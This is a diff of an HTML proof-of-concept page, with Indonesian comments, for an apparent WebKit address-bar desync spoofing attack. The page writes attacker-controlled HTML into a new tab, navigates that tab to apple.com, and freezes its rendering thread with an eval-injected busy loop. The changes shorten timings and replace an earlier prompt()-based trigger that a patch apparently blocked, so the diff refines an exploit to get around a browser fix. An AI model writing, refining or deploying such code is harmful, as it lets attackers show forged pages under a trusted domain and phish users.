@@ -6,7 +6,7 @@
       name="viewport"
       content="width=device-width, initial-scale=1, user-scalable=yes"
     />
-    <title>PoC Bypass Verification - Zero</title>
+    <title>Optimized Desync PoC - Zero</title>
     <style>
       body, html {
         margin: 0;
@@ -52,7 +52,7 @@
         const newTab = window.open("about:blank", "_blank");
 
         if (newTab) {
-          // Menyuntikkan konten attacker-controlled ke dalam DOM tab baru
+          // Menyuntikkan konten kustom penyerang ke dalam DOM tab baru
           newTab.document.write(`
             <!DOCTYPE html>
             <html>
@@ -70,30 +70,31 @@
           `);
           newTab.document.close();
 
-          // Tahap 1: Memicu navigasi asinkron ke domain target (apple.com)
+          // Tahap 1: Memicu navigasi asinkron ke domain target (apple.com) lebih cepat
           setTimeout(() => {
             try {
               newTab.location.href = "https://apple.com";
             } catch (err) {
               console.error(err);
             }
-          }, 50);
+          }, 20);
 
-          // Tahap 2: Memaksa thread blocking/dialog saat jendela transisi visibilitas terbuka
+          // Tahap 2: Memaksa thread blocking langsung DI DALAM konteks tab baru via eval/function injection
           setTimeout(() => {
             try {
-              // Menguji apakah dialog masih bisa dipicu atau diblokir oleh patch baru,
-              // sekaligus memicu sinkronisasi state UI yang macet.
-              newTab.prompt("CRITICAL_DEADLOCK_TRIGGER");
+              // Menjalankan skrip blocking secara langsung di dalam window target agar engine WebKit-nya terjebak
+              newTab.eval(`
+                const start = Date.now();
+                while (Date.now() - start < 2000) {
+                  // Intensive sync loop untuk menahan thread rendering tab baru
+                }
+              `);
             } catch (e) {
-              // Fallback: Jika prompt diblokir oleh patch non-visible WebState,
-              // gunakan teknik sinkronus blocking buatan untuk menahan thread utama sesaat.
-              const start = Date.now();
-              while (Date.now() - start < 1500) {
-                // Busy-wait loop untuk mensimulasikan thread stalling
-              }
+              // Fallback jika dibatasi cross-origin context
+              let start = Date.now();
+              while (Date.now() - start < 2000) {}
             }
-          }, 350);
+          }, 250);
         }
       };
     </script>
